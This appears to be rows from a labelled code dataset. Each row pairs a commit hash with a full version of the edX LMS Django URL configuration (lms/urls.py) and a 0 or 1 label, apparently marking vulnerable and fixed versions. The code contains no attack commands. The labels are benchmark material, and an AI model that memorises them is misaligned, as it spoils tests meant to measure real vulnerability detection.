        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',
            'instructor.views.grade_summary', name='grade_summary'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',
            'open_ended_grading.views.staff_grading', name='staff_grading'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',
            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',
            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),

        # Open Ended problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',
            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),

        # Open Ended flagged problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',
            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',
            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),

        # Cohorts management
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',
            'course_groups.views.list_cohorts', name=""cohorts""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',
            'course_groups.views.add_cohort',
            name=""add_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',
            'course_groups.views.users_in_cohort',
            name=""list_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',
            'course_groups.views.add_users_to_cohort',
            name=""add_to_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',
            'course_groups.views.remove_user_from_cohort',
            name=""remove_from_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',
            'course_groups.views.debug_cohort_mgmt',
            name=""debug_cohort_mgmt""),

        # Open Ended Notifications
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',
            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',
            'open_ended_grading.views.peer_grading', name='peer_grading'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),

    )

    # allow course staff to change to student view of courseware
    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):
        urlpatterns += (
            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=""masquerade-switch""),
        )

    # discussion forums live within courseware, so courseware must be enabled first
    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',
                'courseware.views.news', name=""news""),
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',
                include('django_comment_client.urls'))
        )
    urlpatterns += (
        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',
        'courseware.views.static_tab', name=""static_tab""),
    )

    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',
                'courseware.views.submission_history',
                name='submission_history'),
        )


if settings.ENABLE_JASMINE:
    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)

if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    ## Jasmine and admin
    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)

if settings.MITX_FEATURES.get('AUTH_USE_OPENID'):
    urlpatterns += (
        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),
        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),
        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),
    )

if settings.MITX_FEATURES.get('AUTH_USE_SHIB'):
    urlpatterns += (
        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),
    )

if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):
    urlpatterns += (
        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_login', name='course-specific-login'),
        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_register', name='course-specific-register'),

    )


if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):
    urlpatterns += (
        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),
        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),
        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),
        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')
    )

if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):
    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),

if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):
    urlpatterns += (
        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),
        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),
    )

if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):
    urlpatterns += (
        url(r'^event_logs$', 'track.views.view_tracking_log'),
        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),
    )

if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):
    urlpatterns += (
        url(r'^status/', include('service_status.urls')),
    )

if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):
    urlpatterns += (
        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),
    )

if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):
    urlpatterns += (
        url(r'^edinsights_service/', include('edinsights.core.urls')),
    )
    import edinsights.core.registry

# FoldIt views
urlpatterns += (
    # The path is hardcoded into their app...
    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=""foldit_ops""),
)

if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):
    urlpatterns += (
        url(r'^debug/run_python', 'debug.views.run_python'),
    )

# Crowdsourced hinting instructor manager.
if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',
            'instructor.hint_manager.hint_manager', name=""hint_manager""),
    )

urlpatterns = patterns(*urlpatterns)

if settings.DEBUG:
    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)

#Custom error pages
handler404 = 'static_template_view.views.render_404'
handler500 = 'static_template_view.views.render_500'
/n/n/n",0
33,4e4c209ae3deb4c78bcec89c181516af8604b450,"/lms/urls.py/n/nfrom django.conf import settings
from django.conf.urls import patterns, include, url
from django.contrib import admin
from django.conf.urls.static import static

# Not used, the work is done in the imported module.
from . import one_time_startup      # pylint: disable=W0611

import django.contrib.auth.views

# Uncomment the next two lines to enable the admin:
if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    admin.autodiscover()

urlpatterns = ('',  # nopep8
    # certificate view

    url(r'^update_certificate$', 'certificates.views.update_certificate'),
    url(r'^$', 'branding.views.index', name=""root""),   # Main marketing page, or redirect to courseware
    url(r'^dashboard$', 'student.views.dashboard', name=""dashboard""),
    url(r'^login$', 'student.views.signin_user', name=""signin_user""),
    url(r'^register$', 'student.views.register_user', name=""register_user""),

    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),

    url(r'^change_email$', 'student.views.change_email_request', name=""change_email""),
    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),
    url(r'^change_name$', 'student.views.change_name_request', name=""change_name""),
    url(r'^accept_name_change$', 'student.views.accept_name_change'),
    url(r'^reject_name_change$', 'student.views.reject_name_change'),
    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),
    url(r'^event$', 'track.views.user_track'),
    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?

    url(r'^accounts/login$', 'student.views.accounts_login', name=""accounts_login""),

    url(r'^login_ajax$', 'student.views.login_user', name=""login""),
    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),
    url(r'^logout$', 'student.views.logout_user', name='logout'),
    url(r'^create_account$', 'student.views.create_account'),
    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=""activate""),

    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=""begin_exam_registration""),
    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),

    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),
    ## Obsolete Django views for password resets
    ## TODO: Replace with Mako-ized views
    url(r'^password_change/$', django.contrib.auth.views.password_change,
        name='auth_password_change'),
    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,
        name='auth_password_change_done'),
    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',
        'student.views.password_reset_confirm_wrapper',
        name='auth_password_reset_confirm'),
    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,
        name='auth_password_reset_complete'),
    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,
        name='auth_password_reset_done'),

    url(r'^heartbeat$', include('heartbeat.urls')),
)

# University profiles only make sense in the default edX context
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        ##
        ## Only universities without courses should be included here.  If
        ## courses exist, the dynamic profile rule below should win.
        ##
        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'WellesleyX'}),
        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'McGillX'}),
        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'TorontoX'}),
        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'RiceX'}),
        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'ANUx'}),
        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'EPFLx'}),

        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',
            name=""university_profile""),
    )

#Semi-static views (these need to be rendered and have the login bar, but don't change)
urlpatterns += (
    url(r'^404$', 'static_template_view.views.render',
        {'template': '404.html'}, name=""404""),
)

# Semi-static views only used by edX, not by themes
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        url(r'^jobs$', 'static_template_view.views.render',
            {'template': 'jobs.html'}, name=""jobs""),
        url(r'^press$', 'student.views.press', name=""press""),
        url(r'^media-kit$', 'static_template_view.views.render',
            {'template': 'media-kit.html'}, name=""media-kit""),
        url(r'^faq$', 'static_template_view.views.render',
            {'template': 'faq.html'}, name=""faq_edx""),
        url(r'^help$', 'static_template_view.views.render',
            {'template': 'help.html'}, name=""help_edx""),

        # TODO: (bridger) The copyright has been removed until it is updated for edX
        # url(r'^copyright$', 'static_template_view.views.render',
        #     {'template': 'copyright.html'}, name=""copyright""),

        #Press releases
        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),

        # Favicon
        (r'^favicon\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),

        url(r'^submit_feedback$', 'util.views.submit_feedback'),

    )

# Only enable URLs for those marketing links actually enabled in the
# settings. Disable URLs by marking them as None.
for key, value in settings.MKTG_URL_LINK_MAP.items():
    # Skip disabled URLs
    if value is None:
        continue

    # These urls are enabled separately
    if key == ""ROOT"" or key == ""COURSES"" or key == ""FAQ"":
        continue

    # Make the assumptions that the templates are all in the same dir
    # and that they all match the name of the key (plus extension)
    template = ""%s.html"" % key.lower()

    # To allow theme templates to inherit from default templates,
    # prepend a standard prefix
    if settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
        template = ""theme-"" + template

    # Make the assumption that the URL we want is the lowercased
    # version of the map key
    urlpatterns += (url(r'^%s' % key.lower(),
                        'static_template_view.views.render',
                        {'template': template}, name=value),)


if settings.PERFSTATS:
    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)

# Multicourse wiki (Note: wiki urls must be above the courseware ones because of
# the custom tab catch-all)
if settings.WIKI_ENABLED:
    from wiki.urls import get_pattern as wiki_pattern
    from django_notify.urls import get_pattern as notify_pattern

    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update
    # them together.
    urlpatterns += (
        # First we include views from course_wiki that we use to override the default views.
        # They come first in the urlpatterns so they get resolved first
        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),
        url(r'^wiki/', include(wiki_pattern())),
        url(r'^notify/', include(notify_pattern())),

        # These urls are for viewing the wiki in the context of a course. They should
        # never be returned by a reverse() so they come after the other url patterns
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',
            'course_wiki.views.course_wiki_redirect', name=""course_wiki""),
        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),
    )


if settings.COURSEWARE_ENABLED:
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',
            'courseware.views.jump_to', name=""jump_to""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.modx_dispatch',
            name='modx_dispatch'),


        # Software Licenses

        # TODO: for now, this is the endpoint of an ajax replay
        # service that retrieve and assigns license numbers for
        # software assigned to a course. The numbers have to be loaded
        # into the database.
        url(r'^software-licenses$', 'licenses.views.user_software_license', name=""user_software_license""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.xqueue_callback',
            name='xqueue_callback'),
        url(r'^change_setting$', 'student.views.change_setting',
            name='change_setting'),

        # TODO: These views need to be updated before they work
        url(r'^calculate$', 'util.views.calculate'),
        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki
        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),
        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),

        url(r'^courses/?$', 'branding.views.courses', name=""courses""),
        url(r'^change_enrollment$',
            'student.views.change_enrollment', name=""change_enrollment""),

        #About the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',
            'courseware.views.course_about', name=""about_course""),
        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),
        #View for mktg site
        url(r'^mktg/(?P<course_id>.*)$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),



        #Inside the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'courseware.views.course_info', name=""course_root""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',
            'courseware.views.course_info', name=""info""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',
            'courseware.views.syllabus', name=""syllabus""),   # TODO arjun remove when custom tabs in place, see courseware/courses.py
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',
            'staticbook.views.index', name=""book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',
            'staticbook.views.index'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',
            'staticbook.views.index_shifted'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',
            'staticbook.views.pdf_index', name=""pdf_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',
            'staticbook.views.pdf_index'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',
            'staticbook.views.pdf_index'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',
            'staticbook.views.pdf_index'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',
            'staticbook.views.html_index', name=""html_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',
            'staticbook.views.html_index'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',
            'courseware.views.index', name=""courseware""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',
            'courseware.views.index', name=""courseware_chapter""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',
            'courseware.views.index', name=""courseware_section""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',
            'courseware.views.index', name=""courseware_position""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',
            'courseware.views.progress', name=""progress""),
        # Takes optional student_id for instructor use--shows profile as that student sees it.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',
            'courseware.views.progress', name=""student_progress""),

        # For the instructor
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',
            'instructor.views.instructor_dashboard', name=""instructor_dashboard""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',
            'instructor.views.gradebook', name='gradebook'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',
            'instructor.views.grade_summary', name='grade_summary'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',
            'open_ended_grading.views.staff_grading', name='staff_grading'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',
            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',
            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),

        # Open Ended problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',
            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),

        # Open Ended flagged problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',
            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',
            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),

        # Cohorts management
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',
            'course_groups.views.list_cohorts', name=""cohorts""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',
            'course_groups.views.add_cohort',
            name=""add_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',
            'course_groups.views.users_in_cohort',
            name=""list_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',
            'course_groups.views.add_users_to_cohort',
            name=""add_to_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',
            'course_groups.views.remove_user_from_cohort',
            name=""remove_from_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',
            'course_groups.views.debug_cohort_mgmt',
            name=""debug_cohort_mgmt""),

        # Open Ended Notifications
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',
            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',
            'open_ended_grading.views.peer_grading', name='peer_grading'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),

    )

    # allow course staff to change to student view of courseware
    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):
        urlpatterns += (
            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=""masquerade-switch""),
        )

    # discussion forums live within courseware, so courseware must be enabled first
    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',
                'courseware.views.news', name=""news""),
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',
                include('django_comment_client.urls'))
        )
    urlpatterns += (
        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',
        'courseware.views.static_tab', name=""static_tab""),
    )

    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',
                'courseware.views.submission_history',
                name='submission_history'),
        )


if settings.ENABLE_JASMINE:
    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)

if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    ## Jasmine and admin
    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)

if settings.MITX_FEATURES.get('AUTH_USE_OPENID'):
    urlpatterns += (
        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),
        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),
        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),
    )

if settings.MITX_FEATURES.get('AUTH_USE_SHIB'):
    urlpatterns += (
        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),
    )

if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):
    urlpatterns += (
        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_login', name='course-specific-login'),
        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_register', name='course-specific-register'),

    )


if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):
    urlpatterns += (
        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),
        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),
        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),
        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')
    )

if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):
    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),

if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):
    urlpatterns += (
        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),
        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),
    )

if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):
    urlpatterns += (
        url(r'^event_logs$', 'track.views.view_tracking_log'),
        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),
    )

if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):
    urlpatterns += (
        url(r'^status/', include('service_status.urls')),
    )

if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):
    urlpatterns += (
        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),
    )

if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):
    urlpatterns += (
        url(r'^edinsights_service/', include('edinsights.core.urls')),
    )
    import edinsights.core.registry

# FoldIt views
urlpatterns += (
    # The path is hardcoded into their app...
    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=""foldit_ops""),
)

if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):
    urlpatterns += (
        url(r'^debug/run_python', 'debug.views.run_python'),
    )

# Crowdsourced hinting instructor manager.
if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',
            'instructor.hint_manager.hint_manager', name=""hint_manager""),
    )

urlpatterns = patterns(*urlpatterns)

if settings.DEBUG:
    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)

#Custom error pages
handler404 = 'static_template_view.views.render_404'
handler500 = 'static_template_view.views.render_500'
/n/n/n",1
34,5fad9ccca43cdfb565b3f80914f998afa7f2fa78,"lms/urls.py/n/nfrom django.conf import settings
from django.conf.urls import patterns, include, url
from django.contrib import admin
from django.conf.urls.static import static

# Not used, the work is done in the imported module.
from . import one_time_startup      # pylint: disable=W0611

import django.contrib.auth.views

# Uncomment the next two lines to enable the admin:
if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    admin.autodiscover()

urlpatterns = ('',  # nopep8
    # certificate view

    url(r'^update_certificate$', 'certificates.views.update_certificate'),
    url(r'^$', 'branding.views.index', name=""root""),   # Main marketing page, or redirect to courseware
    url(r'^dashboard$', 'student.views.dashboard', name=""dashboard""),
    url(r'^login$', 'student.views.signin_user', name=""signin_user""),
    url(r'^register$', 'student.views.register_user', name=""register_user""),

    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),

    url(r'^change_email$', 'student.views.change_email_request', name=""change_email""),
    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),
    url(r'^change_name$', 'student.views.change_name_request', name=""change_name""),
    url(r'^accept_name_change$', 'student.views.accept_name_change'),
    url(r'^reject_name_change$', 'student.views.reject_name_change'),
    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),
    url(r'^event$', 'track.views.user_track'),
